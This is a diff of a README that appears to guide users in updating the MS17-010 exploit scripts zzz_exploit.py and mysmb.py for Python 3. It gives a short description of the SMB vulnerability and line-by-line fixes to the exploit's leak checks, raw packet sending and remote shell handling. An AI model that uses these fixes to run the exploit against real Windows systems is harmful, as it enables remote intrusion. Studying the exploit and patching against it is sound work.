@@ -6,40 +6,142 @@ The original repository containing all the exploit files can be accessed at: htt
 
 MS17-010 is a security vulnerability in Microsoft Windows operating systems that was discovered in March 2017. The exploit allows an attacker to remotely execute code on a target system by sending specially crafted packets to the Windows Server Message Block (SMB) protocol. This vulnerability was famously exploited by the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of computers worldwide. Microsoft released a patch to fix the vulnerability shortly after it was discovered.
 
-The suggested changes for `zzz_exploit.py`:
+### The suggested changes for `zzz_exploit.py`:
 
-- At line 321:
+- Substitute:
     ```python
-    (original)     if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
-    (modified)     if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
+    Original:
+    321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
+    ---
+    Modified:
+    321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
     ```
 
-- At line 325:
+- Substitute:
     ```python
-    (original)     elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
-    (modified)     elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
+    Original:
+    325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
+    ---
+    Modified:
+    325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
     ```
 
-- At line 328:
+- Substitute:
     ```python
-    (original)     info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
-    (modified)     info['FRAG_POOL_SIZE'] = leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ] * X64_INFO['POOL_ALIGN']
+    Original:
+    328        info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
+    ---
+    Modified:
+    328        info['FRAG_POOL_SIZE'] = leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ] * X64_INFO['POOL_ALIGN']
     ```
 
-- At line 399:
+- Substitute:
     ```python
-    (original)     conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
-    (modified)     conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs))
+    Original:
+    399        conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
+    ---
+    Modified:
+    399        conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs))
     ```
 
-- At line 418:
+- Substitute:
     ```python
-    (original)     if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
-    (modified)     if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != b'Frag':
+    Original:
+    418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
+    ---
+    Modified:
+    418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != b'Frag':
     ```
 
-- At line 429:
+- Substitute:
     ```python
-    (original)     if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
-    (modified)     if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
+    Original:
+    429        if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
+    ---
+    Modified:
+    429        if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
     ```
+
+### The suggested changes for `mysmb.py`:
+
+- Substitute:
+```python
+Original:
+3          from impacket import smb, smbconnection, smbserver
+---
+Modified:
+3          from impacket import smb, smbconnection
+```
+
+- Remove
+```python
+Original:
+9          try:
+10             import ConfigParser
+11         except ImportError:
+12             import configparser as ConfigParser
+```
+
+- Remove:
+```python
+Original:
+17         SMBSERVER_DIR   = '__tmp'
+18         DUMMY_SHARE     = 'TMP'
+```
+
+- Substitute:
+```python
+Original:
+89         transData += (b'\x00' * padLen) + str.encode(data)
+---
+Modified:
+83         if (type(data) == bytes):
+84             transData += (b'\x00' * padLen) + data
+85         else:
+86             transData += (b'\x00' * padLen) + data.encode('utf-8')
+```
+
+- Substitute:
+```python
+Original:
+420        self.__output = '\\\\%COMPUTERNAME%\\{}\\{}'.format(self.__share,self.__outputFilename)
+---
+Modified:
+417        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
+```
+
+- Substitute:
+```python
+Original:
+483        self.prompt = self.__outputBuffer.decode(errors='replace').replace('\r\n','') + '>'
+---
+Modified:
+489        self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
+```
+
+- Substitute:
+```python
+Original:
+502        output_callback(fd.read().encode('utf-8'))
+---
+Modified:
+499        output_callback(fd.read())
+```
+
+- Substitute:
+```python
+Original:
+528        print(self.__outputBuffer.decode(errors='replace'))
+---
+Modified:
+525        print(self.__outputBuffer.decode())
+```
+
+- Substitute:
+```python
+Original:
+566        smbConfig.set('IPC$','path','')
+---
+Modified:
+563        smbConfig.set('IPC$','path')
+```
